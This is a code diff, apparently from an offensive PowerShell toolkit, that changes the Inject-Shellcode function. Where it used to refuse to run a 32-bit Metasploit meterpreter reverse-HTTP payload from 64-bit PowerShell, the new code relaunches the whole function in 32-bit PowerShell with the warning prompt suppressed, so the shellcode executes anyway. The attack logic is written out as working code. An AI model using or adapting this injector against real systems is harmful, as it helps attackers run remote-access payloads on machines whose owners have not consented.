@@ -525,7 +525,43 @@ function Inject-Shellcode
     if ($PsCmdlet.ParameterSetName -eq 'Metasploit')
     {
         if (!$PowerShell32bit) {
-            Throw 'The meterpreter reverse http payload is only compatible with 32-bit PowerShell'
+            # The currently supported Metasploit payloads are 32-bit. This block of code implements the logic to execute this script from 32-bit PowerShell
+            # Get this script's contents and pass it to 32-bit powershell with the same parameters passed to this function
+
+            # Pull out just the content of the this script's invocation. This is only accessible via a private field of the InvocationInfo object instance
+            $RootInvocation = $MyInvocation.GetType().GetField('_scriptPosition', 'NonPublic, Instance').GetValue($MyInvocation).Text
+
+            $Response = $True
+        
+            if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you want to launch the payload from x86 Powershell?",
+                   "Attempt to execute 32-bit shellcode from 64-bit Powershell. Note: This process takes about one minute. Be patient! You will also see some artifacts of the script loading in the other process." ) ) ) { }
+        
+            if ( !$Response )
+            {
+                # User opted not to launch the 32-bit payload from 32-bit PowerShell. Exit function
+                Return
+            }
+
+            # Since the shellcode will run in a noninteractive instance of PowerShell, make sure the -Force switch is included so that there is no warning prompt.
+            if ($MyInvocation.BoundParameters['Force'])
+            {
+                Write-Verbose "Executing the following from 32-bit PowerShell: $RootInvocation"
+                $Command = "function $($MyInvocation.InvocationName) {`n" + $MyInvocation.MyCommand.ScriptBlock + "`n}`n$($RootInvocation)`n`n"
+            }
+            else
+            {
+                Write-Verbose "Executing the following from 32-bit PowerShell: $RootInvocation -Force"
+                $Command = "function $($MyInvocation.InvocationName) {`n" + $MyInvocation.MyCommand.ScriptBlock + "`n}`n$($RootInvocation) -Force`n`n"
+            }
+
+            $CommandBytes = [System.Text.Encoding]::Ascii.GetBytes($Command)
+            $EncodedCommand = [Convert]::ToBase64String($CommandBytes)
+
+            $Execute = '$Command' + " | $Env:windir\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command -"
+            Invoke-Expression -Command $Execute | Out-Null
+
+            # Exit the script since the shellcode will be running from x86 PowerShell
+            Return
         }
         
         $Response = $True
